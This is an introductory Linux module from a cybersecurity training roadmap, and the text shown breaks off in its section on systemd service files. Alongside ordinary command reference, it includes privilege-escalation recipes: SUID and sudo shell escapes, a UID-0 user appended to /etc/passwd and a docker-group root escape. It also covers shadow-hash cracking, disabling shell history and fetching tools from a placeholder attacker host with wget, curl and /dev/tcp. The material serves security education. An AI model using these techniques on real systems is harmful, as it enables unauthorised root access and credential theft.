# Stage 0.4 — Linux Fundamentals
### From Zero to Cybersecurity Professional | Complete Roadmap Series

> **Series:** Cybersecurity × OT/ICS Security — Full Roadmap  
> **Stage:** 0 — Computer Science Foundations  
> **Module:** 0.4 — Linux Fundamentals  
> **Level:** Beginner → Intermediate  
> **Prerequisites:** Stage 0.2 — OS Fundamentals, Stage 0.3 — Windows Fundamentals  
> **Next Module:** 0.5 — Programming Fundamentals

---

## Table of Contents

1. [Why Linux Is the Security Professional's Native Environment](#1-why-linux-is-the-security-professionals-native-environment)
2. [Linux Distributions](#2-linux-distributions)
3. [The Terminal — Your Primary Interface](#3-the-terminal--your-primary-interface)
4. [Core Commands](#4-core-commands)
5. [File Permissions — rwx, chmod, chown](#5-file-permissions--rwx-chmod-chown)
6. [User Management](#6-user-management)
7. [Package Management](#7-package-management)
8. [Service Management — systemctl](#8-service-management--systemctl)
9. [Cron Jobs](#9-cron-jobs)
10. [Bash Scripting Fundamentals](#10-bash-scripting-fundamentals)
11. [Linux Log System](#11-linux-log-system)
12. [SSH — Secure Shell](#12-ssh--secure-shell)
13. [Linux File System Hierarchy (FHS)](#13-linux-file-system-hierarchy-fhs)
14. [Key Takeaways and Security Mindset](#14-key-takeaways-and-security-mindset)
15. [Hands-On Exercises](#15-hands-on-exercises)
16. [Further Reading and Resources](#16-further-reading-and-resources)

---

## 1. Why Linux Is the Security Professional's Native Environment

Walk into any serious security operations centre, open any penetration testing framework, or look at the infrastructure running the internet — Linux dominates. Apache, Nginx, OpenSSH, iptables, Docker, Kubernetes — all Linux. The majority of web servers, cloud instances, IoT devices, embedded systems, and industrial control systems run some variant of Linux or a Unix-like OS.

More directly: **every security tool you will use in this roadmap runs natively on Linux.** Metasploit, Burp Suite, Nmap, Wireshark, Volatility, Ghidra, John the Ripper, Hashcat, Gobuster, sqlmap — the list is endless. Kali Linux exists precisely because the security community built its entire toolchain on Linux.

**For your OT/ICS path:** A significant portion of OT infrastructure runs Linux or embedded Linux variants. Industrial routers, protocol gateways, historian servers, engineering workstations, and HMI systems increasingly run Linux. RTUs based on embedded Linux are common in modern substations. Understanding Linux is not optional for anyone serious about critical infrastructure security.

**The security mindset for this module:** Linux exposes its internals. Unlike Windows, which hides complexity behind GUIs, Linux makes everything visible — processes, files, network connections, permissions, logs — all readable as text files or command output. This transparency is exactly what security work requires. The command line is not an obstacle. It is precision.

---

## 2. Linux Distributions

### 2.1 What Is a Distribution

The Linux kernel is just the kernel — it provides the interface between hardware and software but does not by itself constitute a usable system. A **distribution (distro)** bundles the Linux kernel with a package manager, system utilities, a desktop environment (optionally), and a collection of software into a coherent, installable operating system.

All major Linux distributions share the same kernel and most of the same core utilities (GNU coreutils). The differences are in package management, release model, default configuration, target audience, and philosophy.

### 2.2 Distributions You Will Encounter

#### Kali Linux
**Your primary security platform.** Maintained by Offensive Security, Kali is a Debian-based distribution designed specifically for penetration testing, digital forensics, and security research. It comes pre-installed with hundreds of security tools.

```
Base:           Debian (rolling release)
Package manager: apt / dpkg
Key tools:      Metasploit, Burp Suite, Nmap, Wireshark, Aircrack-ng,
                John the Ripper, Hashcat, BloodHound, Impacket, and 600+ more
Default user:   kali (older versions used root — a security anti-pattern)
Use case:       Attack platform, security research, CTF
```

> **Important:** Running Kali as root was the historical default but is a poor security habit. Modern Kali runs as a normal user. Never use a security-focused OS as root for daily tasks — if your attack tool is compromised, running as root means the attacker gets root. Use `sudo` only when needed.

#### Parrot OS
Debian-based, similar to Kali but lighter and designed to be used as a daily driver alongside security work. Has both a Security edition (full toolset) and a Home edition (lighter, privacy-focused).

```
Base:           Debian
Use case:       Security work + daily use, privacy-conscious users
Differentiator: Lighter than Kali, AnonSurf for Tor integration
```

#### Ubuntu
The most popular Linux distribution for general use. Excellent hardware support, huge community, extensive documentation. Many production servers run Ubuntu LTS (Long Term Support) versions.

```
Base:           Debian
Release model:  LTS every 2 years (5-year support), interim every 6 months
Package manager: apt / snap
Use case:       Desktop, servers, cloud, your lab VMs
```

#### Debian
The upstream distribution that Ubuntu and Kali are both based on. Known for extreme stability — packages are tested thoroughly before inclusion. The choice for servers where stability matters more than having the latest software.

```
Release model:  Stable (very conservative), Testing, Unstable (Sid)
Use case:       Production servers, base for other distros
Philosophy:     Stability above all, pure free software
```

#### CentOS / Rocky Linux / AlmaLinux
CentOS was the community-supported version of Red Hat Enterprise Linux (RHEL). After Red Hat changed CentOS's model in 2021, Rocky Linux and AlmaLinux emerged as replacements. These are the dominant distributions in enterprise server environments, especially in large corporations and government.

```
Base:           RHEL
Package manager: dnf / rpm
Use case:       Enterprise servers, corporate environments
Security tools: SELinux enabled by default
Note:           You will encounter RHEL-family systems in enterprise assessments
```

#### Kali vs Ubuntu: The Lab Choice

For your lab:
- **Kali Linux** — your attack VM, always
- **Ubuntu Server** — your target/practice Linux VM
- Why Ubuntu as target? It mirrors real-world server deployments and is what you will encounter in CTFs and production environments

### 2.3 The Linux Kernel Version and Security

```bash
# Check kernel version
uname -r
# Output example: 6.1.0-kali9-amd64

# Full system information
uname -a

# Detailed OS information
cat /etc/os-release
lsb_release -a
```

**Security Relevance of Kernel Version:**
Older kernel versions have known privilege escalation vulnerabilities. During post-exploitation, identifying the kernel version is one of the first steps:

```bash
# Kernel version + architecture = potential privilege escalation path
uname -r && uname -m
# Compare against: https://www.kernel.org/
# Tools: linux-exploit-suggester, LES (Linux Exploit Suggester 2)
```

Real examples of kernel-level privilege escalation vulnerabilities by version:
- **CVE-2016-5195 (Dirty COW)** — affects kernels 2.6.22 through 4.8.3 (released 2007, unpatched until 2016)
- **CVE-2021-4034 (PwnKit)** — affects polkit on virtually all Linux systems
- **CVE-2022-0847 (Dirty Pipe)** — affects kernels 5.8 through 5.16.11

---

## 3. The Terminal — Your Primary Interface

### 3.1 Shell vs Terminal vs Console

These terms are often used interchangeably but mean different things:

- **Terminal emulator** — the application window (GNOME Terminal, Konsole, xterm, iTerm2). It provides the interface to interact with the shell.
- **Shell** — the command interpreter that reads your commands and executes them. Common shells: `bash`, `zsh`, `fish`, `sh`, `dash`.
- **Console** — the physical or virtual text interface, typically refers to the system console before a graphical environment loads.

```bash
# Find out which shell you are using
echo $SHELL
# Output: /bin/bash  or  /bin/zsh  etc.

# List available shells on the system
cat /etc/shells

# Switch to a different shell temporarily
zsh
bash
```

### 3.2 The Bash Shell

**Bash (Bourne Again Shell)** is the default shell on most Linux distributions. It is the shell you will use for the majority of your security work and scripting.

#### Prompt Anatomy

```bash
kali@kali:~$          # Normal user prompt
root@kali:/etc#       # Root user prompt (# instead of $)

# Breakdown:
# kali     = current username
# kali     = hostname
# ~        = current directory (~ = home directory)
# $        = non-root user  |  # = root user
```

The `$` vs `#` distinction is critical — `#` means you are root. During a privilege escalation in a CTF or pentest, going from `$` to `#` is the goal.

#### Essential Shell Shortcuts

| Shortcut | Action | Security Use |
|----------|--------|-------------|
| `Ctrl+C` | Kill current process | Stop a running scan/tool |
| `Ctrl+Z` | Suspend process to background | Background a listener |
| `Ctrl+D` | EOF / logout | Close a shell session |
| `Ctrl+R` | Reverse history search | Find previous commands fast |
| `Tab` | Autocomplete | Speed + accuracy |
| `!!` | Repeat last command | `sudo !!` after a permission error |
| `!nmap` | Repeat last command starting with "nmap" | |
| `Ctrl+L` | Clear screen | Same as `clear` |
| `Ctrl+A` | Go to beginning of line | |
| `Ctrl+E` | Go to end of line | |

```bash
# History — one of the most valuable forensic artefacts
history              # Show command history
history 50           # Show last 50 commands
!123                 # Re-run command number 123
!!                   # Re-run last command

# History file location
cat ~/.bash_history

# OPSEC note for attackers:
# Disable history for sensitive session
unset HISTFILE        # Don't save history for this session
export HISTSIZE=0     # Set history size to 0
# Or work in /dev/shm (RAM, no disk writes)
```

### 3.3 Standard Streams and Redirection

Every Linux process has three standard streams:
- **stdin (0)** — standard input (keyboard by default)
- **stdout (1)** — standard output (terminal by default)
- **stderr (2)** — standard error (terminal by default)

```bash
# Redirect stdout to a file (overwrite)
nmap -sV 192.168.1.1 > scan_results.txt

# Redirect stdout to a file (append)
nmap -sV 192.168.1.2 >> scan_results.txt

# Redirect stderr to a file
find / -name "*.conf" 2> errors.txt

# Redirect both stdout and stderr
nmap -sV 192.168.1.1 > output.txt 2>&1
# Or:
nmap -sV 192.168.1.1 &> output.txt

# Discard errors (send to /dev/null — the black hole)
find / -name "passwords.txt" 2>/dev/null
# This suppresses "Permission denied" errors during file searches
# You will use "2>/dev/null" constantly
```

### 3.4 Pipes — The Core of Linux Power

The pipe `|` sends the stdout of one command as stdin to the next. This is the fundamental mechanism for composing powerful one-liners.

```bash
# List all processes, filter for a specific one
ps aux | grep "apache"

# Find all SUID files, sort by path
find / -perm -4000 2>/dev/null | sort

# Count lines in output
cat /etc/passwd | wc -l

# Complex chain: find listening services, extract port numbers, sort
ss -tlnp | grep LISTEN | awk '{print $4}' | cut -d: -f2 | sort -n

# netstat equivalent with port and process
ss -tlnp | awk 'NR>1 {print $4, $6}' | column -t
```

---

## 4. Core Commands

### 4.1 Navigation

```bash
# Print working directory — where am I?
pwd

# Change directory
cd /etc                  # Absolute path
cd ..                    # Go up one level
cd ../..                 # Go up two levels
cd ~                     # Go to home directory
cd -                     # Go to previous directory (toggle)

# List directory contents
ls                       # Basic listing
ls -l                    # Long format (permissions, owner, size, date)
ls -la                   # Long format including hidden files (. prefix)
ls -lh                   # Human-readable file sizes (KB, MB, GB)
ls -lt                   # Sort by modification time (newest first)
ls -lR                   # Recursive listing
ls -la /etc/             # List specific directory

# The long format decoded:
# -rwxr-xr--  2  root  wheel  4096  Jan 1 00:00  filename
#  ─────────  ─  ────  ─────  ────  ──────────── ────────
#  permissions links owner group  size  timestamp  name
```

### 4.2 File and Directory Operations

```bash
# Create
mkdir new_directory
mkdir -p path/to/nested/directory    # Create parent dirs as needed
touch new_file.txt                   # Create empty file or update timestamp

# Copy
cp source.txt destination.txt        # Copy file
cp -r source_dir/ dest_dir/          # Copy directory recursively
cp -p source.txt dest.txt            # Preserve permissions and timestamps

# Move and Rename
mv old_name.txt new_name.txt         # Rename file
mv file.txt /tmp/                    # Move to directory
mv -i file.txt dest.txt              # Interactive (prompt before overwrite)

# Delete
rm file.txt                          # Remove file
rm -f file.txt                       # Force (no error if not exists)
rm -r directory/                     # Remove directory recursively
rm -rf directory/                    # Force recursive removal (use carefully)

# DANGER: rm -rf with wrong path or wildcard can destroy the system
# Always double-check before running rm -rf

# View file contents
cat file.txt                         # Print entire file
cat -n file.txt                      # Print with line numbers
less file.txt                        # Scrollable view (q to quit)
more file.txt                        # Older paginator
head file.txt                        # First 10 lines
head -n 20 file.txt                  # First 20 lines
tail file.txt                        # Last 10 lines
tail -n 20 file.txt                  # Last 20 lines
tail -f /var/log/auth.log            # Follow file (live updates) — essential for log monitoring
```

### 4.3 Searching — grep and find

These two commands are among the most important in security work.

#### grep — Search Inside Files

```bash
# Basic search
grep "password" file.txt             # Case-sensitive search
grep -i "password" file.txt          # Case-insensitive
grep -r "password" /etc/             # Recursive through directory
grep -r "password" /etc/ 2>/dev/null # Suppress permission errors

# Line numbers and context
grep -n "root" /etc/passwd           # Show line numbers
grep -A 3 "error" log.txt            # 3 lines AFTER match
grep -B 3 "error" log.txt            # 3 lines BEFORE match
grep -C 3 "error" log.txt            # 3 lines each side (context)

# Invert match (lines NOT matching)
grep -v "^#" /etc/ssh/sshd_config    # Exclude comment lines
grep -v "^$" file.txt                # Exclude empty lines

# Extended regex
grep -E "root|admin|sudo" /etc/passwd
grep -E "^[0-9]{1,3}\.[0-9]{1,3}" file.txt  # Lines starting with IP-like pattern

# Count matches
grep -c "Failed" /var/log/auth.log

# Only print matching part (not whole line)
grep -o "[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+" file.txt  # Extract IP addresses

# Security use cases:
# Find passwords in config files
grep -r "password\|passwd\|secret\|key\|token" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null

# Find failed SSH attempts
grep "Failed password" /var/log/auth.log

# Find successful SSH logins
grep "Accepted" /var/log/auth.log
```

#### find — Search the File System

```bash
# Find by name
find /etc -name "passwd"             # Exact name match
find /etc -name "*.conf"             # Wildcard
find /etc -iname "*.CONF"           # Case-insensitive

# Find by type
find /tmp -type f                    # Only files
find /tmp -type d                    # Only directories
find /tmp -type l                    # Only symlinks

# Find by permissions
find / -perm -4000 2>/dev/null       # SUID files — privilege escalation check
find / -perm -2000 2>/dev/null       # SGID files
find / -perm -0002 2>/dev/null       # World-writable files

# Find by owner
find / -user root -perm -4000 2>/dev/null    # SUID files owned by root
find /home -user john                         # Files owned by user john
find / -nouser 2>/dev/null                    # Files with no valid owner

# Find by time
find /tmp -mmin -60                  # Modified in last 60 minutes
find /var/log -mtime -1              # Modified in last 24 hours
find /etc -newer /etc/passwd         # Newer than passwd file

# Find by size
find / -size +10M 2>/dev/null        # Files larger than 10MB
find / -size -1k -type f            # Files smaller than 1KB

# Execute command on found files
find / -perm -4000 -exec ls -la {} \; 2>/dev/null
find /tmp -name "*.sh" -exec chmod +x {} \;

# Combined conditions
find / -user root -perm -4000 -not -path "/proc/*" 2>/dev/null

# Security-critical find commands:
# Find recently modified files (potential indicator of compromise)
find /etc -mtime -1 -type f 2>/dev/null
find /var/www -mtime -7 -name "*.php" 2>/dev/null

# Find world-writable directories (potential attack paths)
find / -type d -perm -0002 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null

# Find files containing passwords in web directories
find /var/www -name "*.php" -exec grep -l "password\|passwd\|db_pass" {} \;
```

### 4.4 Text Processing

```bash
# Sort
sort file.txt                        # Alphabetical sort
sort -n file.txt                     # Numerical sort
sort -r file.txt                     # Reverse sort
sort -u file.txt                     # Sort and remove duplicates

# Remove duplicates
uniq sorted_file.txt                 # Remove consecutive duplicates (must be sorted first)
sort file.txt | uniq                 # Sort then deduplicate
sort file.txt | uniq -c             # Count occurrences

# Count
wc -l file.txt                       # Count lines
wc -w file.txt                       # Count words
wc -c file.txt                       # Count bytes

# Cut — extract columns
cat /etc/passwd | cut -d: -f1        # Extract usernames (field 1, colon delimiter)
cat /etc/passwd | cut -d: -f1,3      # Extract username and UID

# Awk — powerful field processing
awk -F: '{print $1}' /etc/passwd     # Same as cut example above
awk -F: '{print $1, $3}' /etc/passwd # Print username and UID
awk '{sum += $1} END {print sum}' numbers.txt  # Sum a column
ps aux | awk '{print $1, $2, $11}'  # Print user, PID, and command

# Sed — stream editor
sed 's/old/new/' file.txt            # Replace first occurrence per line
sed 's/old/new/g' file.txt           # Replace all occurrences
sed 's/password=.*/password=REDACTED/' config.txt  # Redact passwords in output
sed -i 's/old/new/g' file.txt        # Edit file in place (-i)
sed '/^#/d' file.txt                 # Delete comment lines
sed '/^$/d' file.txt                 # Delete empty lines

# tr — translate characters
echo "HELLO" | tr 'A-Z' 'a-z'       # Lowercase
cat file.txt | tr -d '\r'           # Remove Windows carriage returns
echo "hello world" | tr ' ' '\n'    # Replace spaces with newlines
```

### 4.5 Network Commands

```bash
# IP configuration
ip addr                              # Show all interfaces and IPs
ip addr show eth0                    # Specific interface
ifconfig                             # Legacy (may need net-tools package)

# Routing
ip route                             # Routing table
ip route show default                # Default gateway
route -n                             # Legacy routing table

# Network connections
ss -tlnp                             # TCP listening ports with process names
ss -tulnp                            # TCP and UDP listening
ss -anp                              # All connections
netstat -tlnp                        # Legacy equivalent

# Connectivity testing
ping -c 4 8.8.8.8                    # Ping with 4 packets
ping -c 1 -W 1 192.168.1.1           # Quick single ping, 1 second timeout

# DNS lookups
nslookup domain.com
dig domain.com                       # Detailed DNS query
dig +short domain.com                # Just the IP
dig MX domain.com                    # MX records
host domain.com                      # Simple lookup

# Traceroute
traceroute 8.8.8.8
traceroute -n 8.8.8.8                # No DNS resolution (faster)

# Download files
wget http://example.com/file.txt     # Download file
wget -q -O /tmp/file.txt http://url  # Quiet, specific output path
curl http://example.com              # HTTP request
curl -s http://example.com           # Silent (no progress bar)
curl -o file.txt http://url          # Save to file
curl -L http://url                   # Follow redirects
curl -X POST -d "data=value" http://url  # POST request

# Network file transfer — common in post-exploitation
# On attacker: python3 -m http.server 8080
# On target:   wget http://attacker_ip:8080/file.sh
```

---

## 5. File Permissions — rwx, chmod, chown

We introduced Linux permissions in Stage 0.2 during the ext4 discussion. Here we go deep on every detail, because **file permissions are the most common privilege escalation vector on Linux systems.**

### 5.1 Permission Bits — The Full Picture

```bash
ls -la /etc/passwd
# -rw-r--r-- 1 root root 2847 Jan 1 00:00 /etc/passwd
# ─────────── 
# Position 1:    file type (- = regular file, d = directory, l = symlink,
#                            b = block device, c = char device, p = pipe, s = socket)
# Positions 2-4: owner permissions (rwx)
# Positions 5-7: group permissions (rwx)
# Positions 8-10: others permissions (rwx)
```

**Reading permission strings:**

| String | Octal | Meaning |
|--------|-------|---------|
| `rwxrwxrwx` | 777 | Everyone can read, write, execute — dangerous |
| `rwxr-xr-x` | 755 | Owner full, group/others read+execute |
| `rw-r--r--` | 644 | Owner read+write, group/others read only |
| `rw-------` | 600 | Owner read+write only — private files |
| `rwx------` | 700 | Owner only, full access |
| `r-xr-xr-x` | 555 | Everyone read+execute, no write |
| `----------` | 000 | No permissions — even owner cannot access |

### 5.2 chmod — Changing Permissions

```bash
# Symbolic mode
chmod u+x script.sh        # Add execute for owner (user)
chmod g-w file.txt         # Remove write from group
chmod o-r file.txt         # Remove read from others
chmod a+r file.txt         # Add read for all (a = all = ugo)
chmod u+x,g+r file.txt     # Multiple changes at once
chmod a-x,u+x file.txt     # Remove execute for all, add for owner

# Octal mode (faster, preferred)
chmod 755 script.sh        # rwxr-xr-x
chmod 644 config.txt       # rw-r--r--
chmod 600 private_key      # rw------- (SSH private keys must be 600)
chmod 700 ~/.ssh           # drwx------ (SSH directory must be 700)
chmod 777 /tmp/shared      # rwxrwxrwx (everyone, use with extreme caution)

# Recursive
chmod -R 755 directory/    # Apply to all files in directory

# Common security configurations:
chmod 600 ~/.ssh/id_rsa           # SSH private key — if not 600, SSH refuses to use it
chmod 644 ~/.ssh/id_rsa.pub       # SSH public key
chmod 700 ~/.ssh                  # SSH directory
chmod 640 /etc/shadow             # Shadow file (root rw, shadow group r)
```

### 5.3 chown — Changing Ownership

```bash
# Change owner
chown john file.txt              # Change owner to john
chown john:developers file.txt   # Change owner AND group
chown :developers file.txt       # Change only group
chown -R www-data:www-data /var/www/html/  # Recursive — web server files

# Check current ownership
ls -la file.txt
stat file.txt                    # Detailed info including ownership

# chgrp — change group only
chgrp developers file.txt        # Same as chown :developers
```

### 5.4 SUID, SGID, Sticky Bit — The Dangerous Trio

Covered in Stage 0.2 theoretically. Here is the practical command reference.

```bash
# SUID — Set User ID (runs as file owner, not executor)
chmod u+s script           # Set SUID symbolically
chmod 4755 script          # Set SUID in octal (4 prefix)

ls -la /usr/bin/passwd
# -rwsr-xr-x  root root  ...  /usr/bin/passwd
#    ^-- lowercase 's' = SUID + execute set
#    ^-- uppercase 'S' = SUID set, execute NOT set (unusual, often misconfiguration)

# SGID — Set Group ID
chmod g+s directory        # Set SGID on directory
chmod 2755 file            # Set SGID in octal (2 prefix)

ls -la
# drwxr-sr-x  root developers  ...  shared_dir
#       ^-- 's' in group execute position = SGID

# Sticky Bit
chmod +t /tmp              # Set sticky bit
chmod 1777 /tmp            # Set sticky bit in octal (1 prefix)

ls -la /
# drwxrwxrwt  root root  ...  tmp
#          ^-- 't' = sticky bit + execute  |  'T' = sticky bit, no execute

# Finding exploitable SUID/SGID files — the first check in Linux privilege escalation:
find / -perm -4000 -type f 2>/dev/null          # All SUID files
find / -perm -2000 -type f 2>/dev/null          # All SGID files
find / -perm -4000 -user root -type f 2>/dev/null  # SUID owned by root (highest risk)

# For each SUID binary found, check GTFOBins:
# https://gtfobins.github.io/
# Example: if /usr/bin/vim is SUID root:
# vim -c ':!/bin/sh'  → root shell
```

### 5.5 Special Permissions in Practice — Privilege Escalation

This is the payoff for understanding permissions. Misconfigured SUID binaries are among the most common paths to root in CTFs and real-world assessments.

**Example attack chain:**
```bash
# Step 1: Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Output includes: /usr/bin/find

# Step 2: Check GTFOBins for "find"
# GTFOBins says: find . -exec /bin/sh -p \; -quit
# The -p flag preserves effective UID

# Step 3: Execute
/usr/bin/find . -exec /bin/sh -p \; -quit
# Shell opens as root because find is SUID root

whoami
# root
```

**Writable /etc/passwd — Another Classic:**
```bash
# If /etc/passwd is world-writable (misconfiguration):
ls -la /etc/passwd
# -rw-rw-rw-  root root  ...  /etc/passwd  ← world-writable!

# Generate password hash
openssl passwd -1 -salt xyz newpassword
# Output: $1$xyz$...

# Add root-level user to /etc/passwd
echo 'hacker:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login as the new user — you get UID 0 (root)
su hacker
whoami
# root
```

---

## 6. User Management

### 6.1 The /etc/passwd File

```bash
cat /etc/passwd
# Format: username:password:UID:GID:GECOS:home:shell
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# john:x:1001:1001:John Smith,,,:/home/john:/bin/bash
```

**Field breakdown:**
- `username` — login name
- `password` — 'x' means password is in /etc/shadow; blank means no password
- `UID` — User ID. 0 = root, 1-999 = system accounts, 1000+ = regular users
- `GID` — Primary Group ID
- `GECOS` — Comment field (full name, contact info)
- `home` — Home directory path
- `shell` — Login shell (`/usr/sbin/nologin` or `/bin/false` prevents interactive login)

**Security checks on /etc/passwd:**
```bash
# Find any user with UID 0 other than root (serious red flag)
awk -F: '($3 == 0) {print}' /etc/passwd

# Find users with no password set (x missing)
awk -F: '($2 == "") {print}' /etc/passwd

# Find users with valid shells (can log in interactively)
grep -v "/nologin\|/false" /etc/passwd | awk -F: '{print $1, $7}'
```

### 6.2 The /etc/shadow File

The shadow file stores password hashes and account policy information. It is readable only by root (and the shadow group on some systems).

```bash
sudo cat /etc/shadow
# Format: username:hash:lastchange:min:max:warn:inactive:expire
# root:$6$salt$hash:18600:0:99999:7:::
# john:$6$salt$longhashstring:19000:0:99999:7:::
# locked_user:!$6$salt$hash:...  (! prefix = account locked)
# no_password::...               (empty hash = no password needed!)
```

**Hash format identifier:**
```
$1$  = MD5 (weak, crackable in seconds with GPU)
$2a$ = bcrypt (strong, slow)
$5$  = SHA-256 (moderate)
$6$  = SHA-512 (current standard on most Linux systems)
$y$  = yescrypt (modern, very strong)
```

**Cracking /etc/shadow hashes (authorised lab/CTF context):**
```bash
# Unshadow combines passwd and shadow for John/Hashcat
unshadow /etc/passwd /etc/shadow > combined.txt

# John the Ripper
john combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat (identify hash type first)
hashcat -m 1800 combined.txt /usr/share/wordlists/rockyou.txt  # SHA-512 = mode 1800
hashcat -m 500 combined.txt /usr/share/wordlists/rockyou.txt   # MD5 = mode 500
```

### 6.3 User Management Commands

```bash
# Add user
sudo useradd -m -s /bin/bash -G sudo username
# -m = create home directory
# -s = specify shell
# -G = additional groups (sudo here gives sudo access)

sudo adduser username      # Interactive, friendlier version

# Set password
sudo passwd username
passwd                     # Change your own password

# Modify user
sudo usermod -aG sudo username    # Add to sudo group (-a = append)
sudo usermod -s /bin/bash username  # Change shell
sudo usermod -L username          # Lock account
sudo usermod -U username          # Unlock account

# Delete user
sudo userdel username             # Keep home directory
sudo userdel -r username          # Remove home directory too

# Switch user
su username                       # Switch to user (needs their password)
su - username                     # Switch with full login environment
sudo su                           # Switch to root (if you have sudo)
sudo -i                           # Root login shell via sudo
sudo -u john command              # Run command as user john
```

### 6.4 sudo — The Privilege Management Gateway

`sudo` (superuser do) allows specific users to run commands with elevated privileges according to rules defined in `/etc/sudoers`.

```bash
# Run command as root
sudo command
sudo apt update

# Run command as specific user
sudo -u www-data ls /var/www

# Edit sudoers safely (ALWAYS use visudo, never edit directly)
sudo visudo

# Check your sudo privileges
sudo -l
# Output shows what you can run as what user
# Example:
# (ALL : ALL) ALL            → can run anything as anyone
# (root) NOPASSWD: /bin/ls  → can run ls as root without password
# (ALL) /usr/bin/python3    → can run python3 as any user
```

**Sudo Privilege Escalation — The CTF Classic:**
```bash
# You find this in sudo -l:
# (ALL) NOPASSWD: /usr/bin/python3

# Exploit it for root shell:
sudo python3 -c 'import os; os.system("/bin/bash")'
# Result: root shell, no password required

# Or with vim:
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
```

GTFOBins lists privilege escalation paths for every common binary that might appear in `sudo -l`. Checking `sudo -l` is always the second thing you do after landing on a Linux system (first is `whoami`).

### 6.5 /etc/group — Group Management

```bash
cat /etc/group
# Format: groupname:password:GID:members
# sudo:x:27:john,alice
# docker:x:998:john

# Find what groups current user belongs to
groups
id                    # More detailed: uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)

# Add group
sudo groupadd developers

# Add user to group
sudo usermod -aG developers john
sudo gpasswd -a john developers

# Security: Check users in sudo/admin groups — who has elevated access?
getent group sudo
getent group wheel     # Red Hat/CentOS equivalent of sudo
cat /etc/group | grep -E "sudo|admin|wheel|root"
```

**The docker Group — A Hidden Root Equivalent:**
```bash
# Being in the docker group is effectively equivalent to root
# Check if you're in docker group:
id | grep docker

# If yes, escape to root:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# This mounts the entire host filesystem inside a container
# and gives you a root shell on the host
# No password required — this is why docker group membership is dangerous
```

---

## 7. Package Management

### 7.1 APT — Debian/Ubuntu/Kali

APT (Advanced Package Tool) is the package manager for Debian-based distributions. It handles software installation, updates, and removal from configured repositories.

```bash
# Repository management
cat /etc/apt/sources.list              # Main repository list
ls /etc/apt/sources.list.d/           # Additional repositories

# Update package index (always run before installing)
sudo apt update

# Upgrade installed packages
sudo apt upgrade                       # Upgrade packages
sudo apt full-upgrade                  # Upgrade including dependency changes
sudo apt dist-upgrade                  # Distribution upgrade

# Install
sudo apt install nmap                  # Install single package
sudo apt install nmap wireshark curl   # Install multiple
sudo apt install -y nmap               # Non-interactive (yes to all)

# Remove
sudo apt remove package_name           # Remove but keep config files
sudo apt purge package_name            # Remove including config files
sudo apt autoremove                    # Remove unused dependencies

# Search
apt search nmap                        # Search by name/description
apt show nmap                          # Detailed package information

# List
dpkg -l                                # List all installed packages
dpkg -l | grep nmap                    # Check if specific package installed
dpkg -L nmap                           # List files installed by package
dpkg -S /usr/bin/nmap                  # Which package owns this file

# Security relevance:
# Check for packages with known vulnerabilities
sudo apt list --upgradable             # Show packages needing updates
```

**Security Note on apt:**
Package repositories are cryptographically signed. APT verifies signatures before installing. Adding untrusted repositories (PPAs, third-party repos) is a security risk — malicious packages from untrusted repos can compromise your system or your attack platform.

### 7.2 YUM / DNF — Red Hat/CentOS/Fedora

```bash
# DNF (modern, replaces YUM on Fedora/RHEL 8+)
sudo dnf update                        # Update all packages
sudo dnf install nmap                  # Install
sudo dnf remove nmap                   # Remove
sudo dnf search nmap                   # Search
sudo dnf info nmap                     # Package information
sudo dnf list installed                # List installed packages

# YUM (legacy, still used on CentOS 7 and older RHEL)
sudo yum update
sudo yum install nmap
sudo yum remove nmap
sudo yum search nmap
rpm -qa                                # List all installed RPM packages
rpm -ql nmap                           # List files in package
rpm -qf /usr/bin/nmap                  # Which package owns this file
```

### 7.3 Installing Without Package Manager — Common in Pentest

In post-exploitation, you often cannot use apt (no internet access, non-standard system). You need to transfer and install tools manually:

```bash
# Compile from source
./configure
make
sudo make install

# Install Go tools
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Install Python tools
pip3 install impacket
pip3 install --break-system-packages tool_name  # On newer systems

# AppImage — self-contained executables
chmod +x tool.AppImage
./tool.AppImage

# Binary transfer without package manager (post-exploitation)
# On attacker:
python3 -m http.server 8080
# On target (no wget? try these):
curl http://attacker/tool -o /tmp/tool
bash -c 'cat < /dev/tcp/attacker_ip/8080'
```

---

## 8. Service Management — systemctl

### 8.1 systemd and Its Role

`systemd` is the init system and service manager used by virtually all modern Linux distributions (Ubuntu 15.04+, Debian 8+, CentOS 7+, Kali). It replaced the older SysVinit (`/etc/init.d/` scripts) and Upstart systems.

`systemctl` is the primary command to interact with systemd.

### 8.2 Core systemctl Commands

```bash
# Service status
systemctl status ssh                   # Status of SSH service
systemctl status ssh -l                # Full output, no truncation

# Start, stop, restart
sudo systemctl start ssh
sudo systemctl stop ssh
sudo systemctl restart ssh             # Stop then start
sudo systemctl reload ssh              # Reload config without full restart (when supported)

# Enable/Disable at boot
sudo systemctl enable ssh              # Start automatically at boot
sudo systemctl disable ssh             # Don't start at boot
sudo systemctl enable --now ssh        # Enable AND start immediately

# List services
systemctl list-units --type=service    # All active services
systemctl list-units --type=service --all  # All including inactive
systemctl list-unit-files --type=service  # All with enable/disable status

# Check if enabled
systemctl is-enabled ssh               # enabled / disabled / static
systemctl is-active ssh                # active / inactive
systemctl is-failed ssh                # Reports failed services

# Service logs
journalctl -u ssh                      # Logs for SSH service
journalctl -u ssh -f                   # Follow (live)
journalctl -u ssh --since "1 hour ago"
journalctl -u ssh -n 50                # Last 50 lines

# System-wide operations
sudo systemctl reboot
sudo systemctl poweroff
sudo systemctl halt
sudo systemctl suspend
```

### 8.3 Service Files — Understanding the Target

Service files define how services are configured. They live in:
```
/etc/systemd/system/       — Custom/overriding service files
/usr/lib/systemd/system/   — Package-installed service files
```

```bash
# View a service file
cat /etc/systemd/system/ssh.service
systemctl cat ssh                      # Display the service file

# Example service file structure:
# [Unit]
# Description=OpenBSD Secure Shell server
# After=network.target
#
# [Service]
# Type=notify
# ExecStart=/usr/sbin/sshd -D
# ExecReload=/bin/kill -HUP $MAINPID
# User=root                           ← What user it runs as
